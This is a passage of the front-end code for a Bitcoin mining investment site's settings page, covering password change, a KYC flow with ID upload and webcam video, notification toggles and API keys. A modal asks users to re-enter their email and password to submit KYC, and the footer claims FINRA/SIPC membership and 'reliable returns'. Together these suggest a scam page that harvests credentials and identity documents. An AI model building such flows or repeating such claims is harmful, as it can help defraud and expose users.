                                <label for="current-password" class="form-label">Current Password</label>
                                <input type="password" id="current-password" class="form-control" required>
                            </div>
                            
                            <div class="form-group">
                                <label for="new-password" class="form-label">New Password</label>
                                <input type="password" id="new-password" class="form-control" required>
                                <div class="password-strength" style="margin-top: 5px;">
                                    <div style="height: 4px; background: var(--gray-light); border-radius: 2px; overflow: hidden;">
                                        <div id="password-strength-meter" style="height: 100%; width: 0%; background: var(--error); transition: var(--transition);"></div>
                                    </div>
                                    <small id="password-strength-text" style="font-size: 0.8rem; color: var(--gray);">Password strength</small>
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label for="confirm-password" class="form-label">Confirm New Password</label>
                                <input type="password" id="confirm-password" class="form-control" required>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline">Cancel</button>
                                <button type="submit" class="btn btn-primary" id="change-password-btn">Change Password</button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <!-- KYC Verification Section -->
                <div class="settings-section" id="kyc-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-id-card"></i> KYC Verification
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-user-check"></i> Identity Verification
                            <span class="verification-badge unverified" id="identity-verification-badge">
                                <i class="fas fa-times-circle"></i> Unverified
                            </span>
                        </h3>
                        
                        <p style="margin-bottom: 20px; color: var(--gray);">
                            To comply with financial regulations, we require identity verification for all accounts. 
                            This helps prevent fraud and keeps our platform secure.
                        </p>
                        
                        <div class="verification-steps">
                            <div class="verification-step active" id="step1">
                                <div class="step-number">1</div>
                                <div class="step-content">
                                    <div class="step-title">Upload ID Document</div>
                                    <div class="step-description">Upload both sides of your government-issued ID</div>
                                </div>
                            </div>
                            
                            <div class="verification-step" id="step2">
                                <div class="step-number">2</div>
                                <div class="step-content">
                                    <div class="step-title">Facial Verification</div>
                                    <div class="step-description">Take a short video following instructions</div>
                                </div>
                            </div>
                            
                            <div class="verification-step" id="step3">
                                <div class="step-number">3</div>
                                <div class="step-content">
                                    <div class="step-title">Submit for Review</div>
                                    <div class="step-description">Complete verification and submit for approval</div>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Step 1: ID Document Upload -->
                        <div id="step1-content" class="step-content-area">
                            <div class="form-row">
                                <div class="form-group">
                                    <label class="form-label">Document Type</label>
                                    <select class="form-control" id="document-type">
                                        <option value="">Select document type</option>
                                        <option value="passport">Passport</option>
                                        <option value="drivers_license">Driver's License</option>
                                        <option value="national_id">National ID</option>
                                    </select>
                                </div>
                                <div class="form-group">
                                    <label class="form-label">Document Number</label>
                                    <input type="text" class="form-control" id="document-number" placeholder="Enter document number">
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Expiration Date</label>
                                <input type="date" class="form-control" id="document-expiry">
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Front Side of ID</label>
                                <div class="kyc-upload-area" id="front-id-upload">
                                    <i class="fas fa-cloud-upload-alt"></i>
                                    <p>Upload front side of your ID</p>
                                    <small>Supported formats: JPG, PNG, PDF (Max 5MB)</small>
                                    <input type="file" id="front-id-file" accept="image/*,.pdf" style="display: none;">
                                </div>
                                <div class="kyc-preview" id="front-id-preview">
                                    <img id="front-id-preview-image" src="" alt="Front ID Preview">
                                    <button type="button" class="btn btn-outline" style="margin-top: 10px;" onclick="removeUpload('front-id')">Remove</button>
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <label class="form-label">Back Side of ID</label>
                                <div class="kyc-upload-area" id="back-id-upload">
                                    <i class="fas fa-cloud-upload-alt"></i>
                                    <p>Upload back side of your ID</p>
                                    <small>Supported formats: JPG, PNG, PDF (Max 5MB)</small>
                                    <input type="file" id="back-id-file" accept="image/*,.pdf" style="display: none;">
                                </div>
                                <div class="kyc-preview" id="back-id-preview">
                                    <img id="back-id-preview-image" src="" alt="Back ID Preview">
                                    <button type="button" class="btn btn-outline" style="margin-top: 10px;" onclick="removeUpload('back-id')">Remove</button>
                                </div>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline" id="cancel-document-btn">Cancel</button>
                                <button type="button" class="btn btn-primary" id="save-document-btn" disabled>Continue to Next Step</button>
                            </div>
                        </div>
                        
                        <!-- Step 2: Facial Verification -->
                        <div id="step2-content" class="step-content-area" style="display: none;">
                            <div class="form-group">
                                <label class="form-label">Facial Verification Video</label>
                                <p style="margin-bottom: 15px; color: var(--gray);">
                                    Please take a short video following the instructions below. This helps us verify that you are a real person.
                                </p>
                                
                                <div class="webcam-container" id="webcam-container">
                                    <video id="webcam-video" autoplay playsinline></video>
                                    <div class="webcam-controls">
                                        <button class="capture-btn" id="capture-btn">
                                            <i class="fas fa-camera"></i>
                                        </button>
                                    </div>
                                    <canvas id="webcam-canvas" style="display: none;"></canvas>
                                </div>
                                
                                <div id="verification-instructions" style="margin-top: 20px;">
                                    <h4 style="margin-bottom: 10px;">Instructions:</h4>
                                    <ol style="padding-left: 20px; margin-bottom: 20px;">
                                        <li style="margin-bottom: 8px;">Hold your ID document next to your face</li>
                                        <li style="margin-bottom: 8px;">Follow the random instructions that will appear</li>
                                        <li style="margin-bottom: 8px;">Make sure your face and the ID are clearly visible</li>
                                        <li style="margin-bottom: 8px;">The video should be 5-10 seconds long</li>
                                    </ol>
                                    
                                    <div id="random-instructions" style="background-color: var(--light); padding: 15px; border-radius: var(--border-radius); margin-bottom: 20px; text-align: center;">
                                        <p id="instruction-text" style="font-weight: 600; color: var(--primary);">Click Start to begin verification</p>
                                    </div>
                                </div>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline" id="back-to-step1">Back</button>
                                <button type="button" class="btn btn-primary" id="start-verification-btn">Start Verification</button>
                                <button type="button" class="btn btn-primary" id="submit-video-btn" style="display: none;">Submit Video</button>
                            </div>
                        </div>
                        
                        <!-- Step 3: Review and Submit -->
                        <div id="step3-content" class="step-content-area" style="display: none;">
                            <div class="form-group">
                                <h4 style="margin-bottom: 15px;">Review Your Information</h4>
                                
                                <div style="background-color: var(--light); padding: 20px; border-radius: var(--border-radius); margin-bottom: 20px;">
                                    <div class="form-row">
                                        <div class="form-group">
                                            <p><strong>Document Type:</strong> <span id="review-document-type">-</span></p>
                                            <p><strong>Document Number:</strong> <span id="review-document-number">-</span></p>
                                        </div>
                                        <div class="form-group">
                                            <p><strong>Expiration Date:</strong> <span id="review-document-expiry">-</span></p>
                                        </div>
                                    </div>
                                    
                                    <div class="form-row">
                                        <div class="form-group">
                                            <p><strong>Front ID:</strong> <span id="review-front-id">Not uploaded</span></p>
                                        </div>
                                        <div class="form-group">
                                            <p><strong>Back ID:</strong> <span id="review-back-id">Not uploaded</span></p>
                                        </div>
                                    </div>
                                    
                                    <div class="form-group">
                                        <p><strong>Facial Verification:</strong> <span id="review-facial-verification">Not completed</span></p>
                                    </div>
                                </div>
                                
                                <div class="disclaimer" style="background-color: rgba(255, 184, 0, 0.1); border-left-color: var(--warning);">
                                    <div class="disclaimer-title">Important Notice</div>
                                    <p>By submitting your KYC verification, you confirm that all information provided is accurate and belongs to you. Providing false information may result in account suspension.</p>
                                </div>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline" id="back-to-step2">Back</button>
                                <button type="button" class="btn btn-primary" id="submit-kyc-btn">Submit for Verification</button>
                            </div>
                        </div>
                    </div>
                </div>
                
                <!-- Notifications Section -->
                <div class="settings-section" id="notifications-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-bell"></i> Notification Preferences
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-envelope"></i> Email Notifications
                        </h3>
                        
                        <form id="email-notifications-form">
                            <div class="form-group" style="display: flex; align-items: center; justify-content: space-between;">
                                <div>
                                    <label class="form-label">Account Activity</label>
                                    <p style="font-size: 0.9rem; color: var(--gray);">Important notifications about your account</p>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="email-account-activity" checked>
                                    <span class="slider round"></span>
                                </label>
                            </div>
                            
                            <div class="form-group" style="display: flex; align-items: center; justify-content: space-between;">
                                <div>
                                    <label class="form-label">Investment Updates</label>
                                    <p style="font-size: 0.9rem; color: var(--gray);">Daily and weekly mining reports</p>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="email-investment-updates" checked>
                                    <span class="slider round"></span>
                                </label>
                            </div>
                            
                            <div class="form-group" style="display: flex; align-items: center; justify-content: space-between;">
                                <div>
                                    <label class="form-label">Promotional Offers</label>
                                    <p style="font-size: 0.9rem; color: var(--gray);">Special offers and new features</p>
                                </div>
                                <label class="switch">
                                    <input type="checkbox" id="email-promotional-offers">
                                    <span class="slider round"></span>
                                </label>
                            </div>
                            
                            <div class="form-actions">
                                <button type="button" class="btn btn-outline" id="reset-email-notifications-btn">Reset to Default</button>
                                <button type="submit" class="btn btn-primary" id="save-email-notifications-btn">Save Preferences</button>
                            </div>
                        </form>
                    </div>
                </div>
                
                <!-- API Keys Section -->
                <div class="settings-section" id="api-section">
                    <h2 class="settings-section-title">
                        <i class="fas fa-key"></i> API Keys Management
                    </h2>
                    
                    <div class="settings-card">
                        <h3 class="settings-card-title">
                            <i class="fas fa-key"></i> Your API Keys
                        </h3>
                        
                        <p style="margin-bottom: 20px; color: var(--gray);">
                            API keys allow external applications to access your BitHash account data. 
                            Treat them like passwords and keep them secure.
                        </p>
                        
                        <table class="api-key-table" id="api-keys-table">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Permissions</th>
                                    <th>Status</th>
                                    <th>Action</th>
                                </tr>
                            </thead>
                            <tbody>
                                <!-- Dynamically populated from backend -->
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer id="contact">
        <div class="container">
            <div class="footer-container">
                <div class="footer-about">
                    <div class="footer-logo">
                        <img src="https://www.dropbox.com/scl/fi/1dq16nex1borvvknpcwox/circular_dark_background.png?rlkey=sq2ujl2oxxk9vyvg1j7oz0cdb&raw=1" alt="BitHash Logo" class="loading-logo">    
                        <span class="footer-logo-text"><span class="bitcoin-animation">₿</span>itHash</span>
                    </div>
                    <p>Bitcoin mining platform serving investors worldwide with transparent operations and reliable returns.</p>
                    <div class="footer-social">
                        <!-- Social Share Buttons -->
                        <a href="https://twitter.com/intent/tweet?url=https://bithhash.vercel.app/&text=Check%20out%20this%20Bitcoin%20mining%20platform!" 
                           class="social-icon twitter" aria-label="Twitter" target="_blank" rel="noopener">
                           <i class="fab fa-twitter"></i>
                        </a>

                        <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://bithhash.vercel.app/" 
                           class="social-icon linkedin" aria-label="LinkedIn" target="_blank" rel="noopener">
                           <i class="fab fa-linkedin-in"></i>
                        </a>

                        <a href="https://www.facebook.com/sharer/sharer.php?u=https://bithhash.vercel.app/" 
                           class="social-icon facebook" aria-label="Facebook" target="_blank" rel="noopener">
                           <i class="fab fa-facebook-f"></i>
                        </a>

                        <a href="https://www.instagram.com" 
                           class="social-icon instagram" aria-label="Instagram" target="_blank" rel="noopener" 
                           onclick="alert('Instagram does not support direct sharing via links. Please share manually.'); return false;">
                           <i class="fab fa-instagram"></i>
                        </a>
                    </div>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Platform</h3>
                    <ul>
                        <li><a href="#home">Dashboard</a></li>
                        <li><a href="#plans">Investment Plans</a></li>
                        <li><a href="#loans">Loans</a></li>
                        <li><a href="dashboard.html">My Account</a></li>
                        <li><a href="rewards.html">Rewards</a></li>
                    </ul>
                </div>
                
                <div class="footer-links">
                    <h3 class="footer-title">Company</h3>
                    <ul>
                        <li><a href="about.html">About Us</a></li>
                        <li><a href="careers.html">Careers</a></li>
                        <li><a href="press.html">Press</a></li>
                        <li><a href="blog.html">Blog</a></li>
                        <li><a href="partners.html">Partners</a></li>
                    </ul>
                </div>
                
                <div class="footer-contact">
                    <h3 class="footer-title">Contact Us</h3>
                    <p><i class="fas fa-envelope"></i> support@bithash.com</p>
                    <p><i class="fas fa-phone"></i> +1 606-363-2032</p>
                    <p><i class="fas fa-map-marker-alt"></i> 800 Plant St, Wilmington, DE 19801, United States</p>
                    <p><i class="fas fa-clock"></i> 24/7 Support</p>
                </div>
            </div>
            
            <div class="footer-bottom">
                <p>&copy; <span id="current-year"></span> BitHash LLC. All Rights Reserved. Registered in Delaware, USA. FINRA/SIPC Member.</p>
            </div>
        </div>
    </footer>

    <!-- Email and Password Verification Modal -->
    <div class="modal-overlay" id="email-password-modal">
        <div class="modal-container">
            <div class="modal-header">
                <h3 class="modal-title">Account Verification Required</h3>
                <button class="modal-close" onclick="closeModal('email-password-modal')">&times;</button>
            </div>
            <div class="modal-body">
                <div class="disclaimer">
                    <div class="disclaimer-title">Security Verification</div>
                    <p>For security purposes, please enter your registered email and password to complete KYC verification.</p>
                </div>
                
                <div class="form-group">
                    <label class="form-label">Email Address</label>
                    <input type="email" id="verification-email" class="form-control" placeholder="Enter your registered email">
                </div>
                
                <div class="form-group">
                    <label class="form-label">Password</label>
                    <input type="password" id="verification-password" class="form-control" placeholder="Enter your password">
                </div>
                
                <div class="disclaimer">
                    <div class="disclaimer-title">Privacy Notice</div>
                    <p>Your credentials are securely transmitted and used only for verification purposes.</p>
                </div>
                
                <div id="verification-result" style="display: none; margin-top: 15px;"></div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-outline" onclick="closeModal('email-password-modal')">Cancel</button>
                <button class="btn btn-primary" onclick="verifyCredentials()">
                    <i class="fas fa-check-circle"></i> Verify & Submit KYC
                </button>
            </div>
        </div>
    </div>

    <!-- KYC Success Modal -->
    <div class="modal-overlay" id="kyc-success-modal">
        <div class="modal-container">
            <div class="modal-header">
                <h3 class="modal-title">KYC Verification Submitted</h3>
                <button class="modal-close" onclick="closeModal('kyc-success-modal')">&times;</button>
            </div>
            <div class="modal-body" style="text-align: center;">
                <div style="margin: 16px 0;">
                    <i class="fas fa-check-circle" style="font-size: 2.5rem; color: var(--success); margin-bottom: 16px;"></i>
                    <h4 style="margin-bottom: 8px;">Verification Submitted Successfully</h4>
                    <p>Your KYC verification has been submitted and is under review. You'll receive an email notification once your verification is complete.</p>
                    <p>This process typically takes 1-2 business days.</p>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-primary" onclick="closeModal('kyc-success-modal')">
                    <i class="fas fa-check"></i> Done
                </button>
            </div>
        </div>
    </div>

<!-- AOS Animation -->
<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>

<script>
    // Initialize AOS animation
    AOS.init({
        duration: 800,
        once: true,
        easing: 'ease-in-out'
    });
    
    // Global state for the application
    const AppState = {
        userData: null,
        kycStatus: {
            identity: 'unverified',
            address: 'unverified',
            facial: 'unverified'
        },
        kycData: {
            documentType: '',
            documentNumber: '',
            documentExpiry: '',
            frontIdFile: null,
            backIdFile: null,
            verificationVideo: null
        },
        currentStep: 1,
        isVerificationActive: false,
        mediaRecorder: null,
        recordedChunks: [],
        instructionInterval: null
    };

    // Hide loading overlay when page is loaded
    window.addEventListener('load', function() {
        setTimeout(async function() {
            document.getElementById('loading-overlay').classList.add('hidden');
            
            // Check authentication and load user data
            await checkAuthState();
            
            // Load all data sections
            await loadUserProfile();
            await loadKYCData();
            
            // Initialize settings sidebar navigation
            initSettingsNavigation();
            
            // Initialize mobile menu
            initMobileMenu();
            
            // Initialize header scroll effect
            initHeaderScrollEffect();
            
            // Initialize KYC functionality
            initKYCFunctionality();
            
            // Initialize form submissions
            initFormSubmissions();
            
        }, 1000);
    });
    
    /* ============================================= */
    /* Initialization Functions */
    /* ============================================= */
    
    // Initialize settings sidebar navigation
    function initSettingsNavigation() {
        const menuLinks = document.querySelectorAll('.settings-menu a');
        const sections = document.querySelectorAll('.settings-section');
        
        menuLinks.forEach(link => {
            link.addEventListener('click', function(e) {
                e.preventDefault();
                
                // Remove active class from all links and sections
                menuLinks.forEach(l => l.classList.remove('active'));
                sections.forEach(s => s.classList.remove('active'));
                
                // Add active class to clicked link
                this.classList.add('active');
                
                // Show corresponding section
                const targetId = this.getAttribute('href').substring(1) + '-section';
                document.getElementById(targetId).classList.add('active');
            });
        });
    }
    
    // Initialize mobile menu - Enhanced with smooth animation
    function initMobileMenu() {
        const mobileMenuToggle = document.getElementById('mobile-menu-toggle');
        const mainNav = document.getElementById('main-nav');
        
        if (mobileMenuToggle && mainNav) {
            mobileMenuToggle.addEventListener('click', function() {
                this.classList.toggle('active');
                mainNav.classList.toggle('active');
                this.setAttribute('aria-expanded', mainNav.classList.contains('active'));
                
                // Toggle body overflow when menu is open
                if (mainNav.classList.contains('active')) {
                    document.body.style.overflow = 'hidden';
                } else {
                    document.body.style.overflow = '';
                }
            });
            
            // Close mobile menu when clicking a link
            document.querySelectorAll('#main-nav a').forEach(link => {
                link.addEventListener('click', () => {
                    if (window.innerWidth <= 768) {
                        mobileMenuToggle.classList.remove('active');
                        mainNav.classList.remove('active');
                        document.body.style.overflow = '';
                        mobileMenuToggle.setAttribute('aria-expanded', 'false');
                    }
                });
            });
        }
    }
    
    // Initialize header scroll effect
    function initHeaderScrollEffect() {
        window.addEventListener('scroll', function() {
            const header = document.getElementById('main-header');
            if (window.scrollY > 50) {
                header.classList.add('scrolled');
            } else {
                header.classList.remove('scrolled');
            }
        });
    }
    
    // Initialize KYC functionality
    function initKYCFunctionality() {
        // Initialize file uploads
        initFileUpload('front-id-file', 'front-id-upload', 'front-id-preview', 'front-id-preview-image');
        initFileUpload('back-id-file', 'back-id-upload', 'back-id-preview', 'back-id-preview-image');
        
        // Initialize step navigation
        initStepNavigation();
        
        // Initialize verification button
        document.getElementById('save-document-btn').addEventListener('click', function() {
            if (validateStep1()) {
                goToStep(2);
            }
        });
        
        document.getElementById('back-to-step1').addEventListener('click', function() {
            goToStep(1);
        });
        
        document.getElementById('back-to-step2').addEventListener('click', function() {
            goToStep(2);
        });
        
        document.getElementById('start-verification-btn').addEventListener('click', function() {
            startFacialVerification();
        });
        
        document.getElementById('submit-video-btn').addEventListener('click', function() {
            stopFacialVerification();
        });
        
        document.getElementById('submit-kyc-btn').addEventListener('click', function() {
            openModal('email-password-modal');
        });
    }
    
    // Initialize file upload functionality
    function initFileUpload(fileInputId, uploadAreaId, previewId, previewImageId) {
        const fileInput = document.getElementById(fileInputId);
        const uploadArea = document.getElementById(uploadAreaId);
        const preview = document.getElementById(previewId);
        const previewImage = document.getElementById(previewImageId);
        
        uploadArea.addEventListener('click', function() {
            fileInput.click();
        });
        
        fileInput.addEventListener('change', function(e) {
            if (this.files && this.files[0]) {
                const file = this.files[0];
                
                // Validate file type and size
                if (!validateFile(file)) {
                    return;
                }
                
                // Store file in AppState
                if (fileInputId === 'front-id-file') {
                    AppState.kycData.frontIdFile = file;
                } else if (fileInputId === 'back-id-file') {
                    AppState.kycData.backIdFile = file;
                }
                
                // Show preview
                if (file.type.startsWith('image/')) {
                    const reader = new FileReader();
                    reader.onload = function(e) {
                        previewImage.src = e.target.result;
                        preview.style.display = 'block';
                        uploadArea.style.display = 'none';
                        
                        // Enable continue button if both files are uploaded
                        checkStep1Completion();
                    };
                    reader.readAsDataURL(file);
                } else if (file.type === 'application/pdf') {
                    // For PDF files, we can't preview as image, so show a placeholder
                    previewImage.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgdmlld0JveD0iMCAwIDIwMCAyMDAiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIiBmaWxsPSIjMzMzMzMzIi8+CjxwYXRoIGQ9Ik03NSA3NUgxMjVWODcuNUg3NVY3NVoiIGZpbGw9IiNGRkZGRkYiLz4KPHBhdGggZD0iTTc1IDEwMEgxMjVWMTEyLjVINzVWMTAwWiIgZmlsbD0iI0ZGRkZGRiIvPgo8cGF0aCBkPSJNNzUgMTI1SDEyNVYxMzdINzVWMTI1WiIgZmlsbD0iI0ZGRkZGRiIvPgo8cGF0aCBkPSJNNzUgMTUwSDEwMFYxNjIuNUg3NVYxNTBaIiBmaWxsPSIjRkZGRkZGIi8+CjxwYXRoIGQ9Ik0xMjUgNTBINzVWNjIuNUgxMjVWNTVWMzcuNUwxMzcuNSA1MFYxNjIuNUg2Mi41VjM3LjVIMTEyLjVMMTI1IDUwWiIgc3Ryb2tlPSIjRkZGRkZGIiBzdHJva2Utd2lkdGg9IjUiLz4KPC9zdmc+';
                    preview.style.display = 'block';
                    uploadArea.style.display = 'none';
                    
                    // Enable continue button if both files are uploaded
                    checkStep1Completion();
                }
            }
        });
    }
    
    // Validate file type and size
    function validateFile(file) {
        const validTypes = ['image/jpeg', 'image/jpg', 'image/png', 'application/pdf'];
        const maxSize = 5 * 1024 * 1024; // 5MB
        
        if (!validTypes.includes(file.type)) {
            showNotification('error', 'Invalid File Type', 'Please upload JPG, PNG, or PDF files only.');
            return false;
        }
        
        if (file.size > maxSize) {
            showNotification('error', 'File Too Large', 'File size must be less than 5MB.');
            return false;
        }
        
        return true;
    }
    
    // Remove uploaded file
    function removeUpload(type) {
        if (type === 'front-id') {
            document.getElementById('front-id-file').value = '';
            document.getElementById('front-id-preview').style.display = 'none';
            document.getElementById('front-id-upload').style.display = 'block';
            AppState.kycData.frontIdFile = null;
        } else if (type === 'back-id') {
            document.getElementById('back-id-file').value = '';
            document.getElementById('back-id-preview').style.display = 'none';
            document.getElementById('back-id-upload').style.display = 'block';
            AppState.kycData.backIdFile = null;
        }
        
        checkStep1Completion();
    }
    
    // Check if step 1 is complete
    function checkStep1Completion() {
        const documentType = document.getElementById('document-type').value;
        const documentNumber = document.getElementById('document-number').value;
        const documentExpiry = document.getElementById('document-expiry').value;
        const frontIdFile = AppState.kycData.frontIdFile;
        const backIdFile = AppState.kycData.backIdFile;
        
        const isComplete = documentType && documentNumber && documentExpiry && frontIdFile && backIdFile;
        document.getElementById('save-document-btn').disabled = !isComplete;
        
        return isComplete;
    }
    
    // Validate step 1 data
    function validateStep1() {
        if (!checkStep1Completion()) {
            showNotification('error', 'Incomplete Information', 'Please complete all fields and upload both sides of your ID.');
            return false;
        }
        
        // Store data in AppState
        AppState.kycData.documentType = document.getElementById('document-type').value;
        AppState.kycData.documentNumber = document.getElementById('document-number').value;
        AppState.kycData.documentExpiry = document.getElementById('document-expiry').value;
        
        return true;
    }
    
    // Initialize step navigation
    function initStepNavigation() {
        // Update review section when moving to step 3
        document.getElementById('back-to-step2').addEventListener('click', function() {
            updateReviewSection();
        });
    }
    
    // Go to specific step
    function goToStep(step) {
        // Hide all step contents
        document.getElementById('step1-content').style.display = 'none';
        document.getElementById('step2-content').style.display = 'none';
        document.getElementById('step3-content').style.display = 'none';
        
        // Remove active class from all steps
        document.getElementById('step1').classList.remove('active', 'completed');
        document.getElementById('step2').classList.remove('active', 'completed');
        document.getElementById('step3').classList.remove('active', 'completed');
        
        // Show current step content and mark previous steps as completed
        document.getElementById(`step${step}-content`).style.display = 'block';
        
        for (let i = 1; i <= step; i++) {
            if (i < step) {
                document.getElementById(`step${i}`).classList.add('completed');
            } else {
                document.getElementById(`step${i}`).classList.add('active');
            }
        }
        
        AppState.currentStep = step;
        
        // If moving to step 3, update the review section
        if (step === 3) {
            updateReviewSection();
        }
    }
    
    // Update review section with collected data
    function updateReviewSection() {
        document.getElementById('review-document-type').textContent = 
            document.getElementById('document-type').options[document.getElementById('document-type').selectedIndex].text;
        document.getElementById('review-document-number').textContent = AppState.kycData.documentNumber;
        document.getElementById('review-document-expiry').textContent = AppState.kycData.documentExpiry;
        
        document.getElementById('review-front-id').textContent = 
            AppState.kycData.frontIdFile ? AppState.kycData.frontIdFile.name : 'Not uploaded';
        document.getElementById('review-back-id').textContent = 
            AppState.kycData.backIdFile ? AppState.kycData.backIdFile.name : 'Not uploaded';
        
        document.getElementById('review-facial-verification').textContent = 
            AppState.kycData.verificationVideo ? 'Completed' : 'Not completed';
    }
    
    // Initialize form submissions
    function initFormSubmissions() {
        // Profile form
        const profileForm = document.getElementById('profile-form');
        if (profileForm) {
            profileForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                await saveProfile();
            });
        }
        
        // Address form
        const addressForm = document.getElementById('address-form');
        if (addressForm) {
            addressForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                await saveAddress();
            });
        }
        
        // Password form
        const passwordForm = document.getElementById('password-form');
        if (passwordForm) {
            passwordForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                await changePassword();
            });
        }
        
        // Email notifications form
        const emailNotificationsForm = document.getElementById('email-notifications-form');
        if (emailNotificationsForm) {
            emailNotificationsForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                await saveEmailNotifications();
            });
        }
    }
    
    /* ============================================= */
    /* Facial Verification Functions */
    /* ============================================= */
    
    // Start facial verification
    async function startFacialVerification() {
        try {
            // Request camera access
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { 
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                },
                audio: false
            });
            
            const video = document.getElementById('webcam-video');
            video.srcObject = stream;
            
            // Initialize media recorder
            AppState.recordedChunks = [];
            AppState.mediaRecorder = new MediaRecorder(stream, {
                mimeType: 'video/webm;codecs=vp9'
            });
            
            AppState.mediaRecorder.ondataavailable = function(event) {
                if (event.data.size > 0) {
                    AppState.recordedChunks.push(event.data);
                }
            };
            
            AppState.mediaRecorder.onstop = function() {
                const blob = new Blob(AppState.recordedChunks, { type: 'video/webm' });
                AppState.kycData.verificationVideo = blob;
                
                // Show submit button
                document.getElementById('submit-video-btn').style.display = 'inline-flex';
                document.getElementById('start-verification-btn').style.display = 'none';
                
                // Stop all tracks
                stream.getTracks().forEach(track => track.stop());
                
                showNotification('success', 'Video Recorded', 'Facial verification video has been recorded successfully.');
            };
            
            // Start recording
            AppState.mediaRecorder.start();
            AppState.isVerificationActive = true;
            
            // Update UI
            document.getElementById('start-verification-btn').style.display = 'none';
            document.getElementById('instruction-text').textContent = 'Recording... Please follow the instructions below.';
            
            // Start instruction sequence
            startInstructionSequence();
            
        } catch (error) {
            console.error('Error accessing camera:', error);
            showNotification('error', 'Camera Access Error', 'Could not access your camera. Please check permissions and try again.');
        }
    }
    
    // Stop facial verification
    function stopFacialVerification() {
        if (AppState.mediaRecorder && AppState.isVerificationActive) {
            AppState.mediaRecorder.stop();
            AppState.isVerificationActive = false;
            
            // Clear instruction interval
            if (AppState.instructionInterval) {
                clearInterval(AppState.instructionInterval);
            }
            
            // Update UI
            document.getElementById('instruction-text').textContent = 'Verification complete! Click "Submit Video" to continue.';
            
            // Enable continue to next step
            document.getElementById('submit-video-btn').disabled = false;
        }
    }
    
    // Start instruction sequence for facial verification
    function startInstructionSequence() {
        const instructions = [
            "Hold your ID next to your face",
            "Move your head slowly to the left",
            "Move your head slowly to the right",
            "Move your head slowly up",
            "Move your head slowly down",
            "Smile for the camera",
            "Keep holding the ID steady"
        ];
        
        let currentInstruction = 0;
        const instructionElement = document.getElementById('instruction-text');
        
        // Show first instruction immediately
        instructionElement.textContent = instructions[currentInstruction];
        
        // Change instruction every 3 seconds
        AppState.instructionInterval = setInterval(() => {
            currentInstruction = (currentInstruction + 1) % instructions.length;
            instructionElement.textContent = instructions[currentInstruction];
        }, 3000);
    }
    
    /* ============================================= */
    /* Data Loading Functions */
    /* ============================================= */
    
    // Check authentication state
    async function checkAuthState() {
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) {
                document.getElementById('auth-buttons').style.display = 'flex';
                document.getElementById('user-balance').style.display = 'none';
                window.location.href = 'login.html';
                return;
            }
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/me', {
                headers: {
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
                const userData = await response.json();
                AppState.userData = userData;
                
                document.getElementById('auth-buttons').style.display = 'none';
                document.getElementById('user-balance').style.display = 'flex';
                
                // Fetch both balances like in withdrawal.html
                await fetchUserBalances();
                
                // Set up logout dropdown
                const userBalance = document.getElementById('user-balance');
                const logoutDropdown = document.getElementById('logout-dropdown');
                
                if (userBalance && logoutDropdown) {
                    userBalance.addEventListener('mouseenter', function() {
                        logoutDropdown.style.display = 'block';
                    });
                    
                    userBalance.addEventListener('mouseleave', function() {
                        logoutDropdown.style.display = 'none';
                    });
                }
            } else {
                localStorage.removeItem('jwtToken');
                document.getElementById('auth-buttons').style.display = 'flex';
                document.getElementById('user-balance').style.display = 'none';
                window.location.href = 'login.html';
            }
        } catch (error) {
            console.error('Authentication check failed:', error);
            showNotification('Session Error', 'Failed to verify your session. Please login again.', 5000);
        }
    }
    
    // Fetch user balances like in withdrawal.html
    async function fetchUserBalances() {
        try {
            const token = localStorage.getItem('jwtToken');
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/balances', {
                headers: {
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
                const data = await response.json();
                const balances = data.data.balances;
                
                // Calculate total balance
                const mainBalance = balances.main || 0;
                const maturedBalance = balances.matured || 0;
                const totalBalance = mainBalance + maturedBalance;
                
                // Update balance display
                document.getElementById('balance-amount').textContent = `$${totalBalance.toFixed(2)}`;
            } else {
                throw new Error('Failed to load balance data');
            }
        } catch (error) {
            console.error('Error loading balances:', error);
            // Don't show error notification for balance loading to avoid disrupting user experience
        }
    }
    
    // Load user profile data
    async function loadUserProfile() {
        try {
            const token = localStorage.getItem('jwtToken');
            if (!token) {
                window.location.href = 'login.html';
                return;
            }
            
            const response = await fetch('https://website-backendd-1.onrender.com/api/users/profile', {
                headers: {
                    'Authorization': `Bearer ${token}`
                }
            });
            
            if (response.ok) {
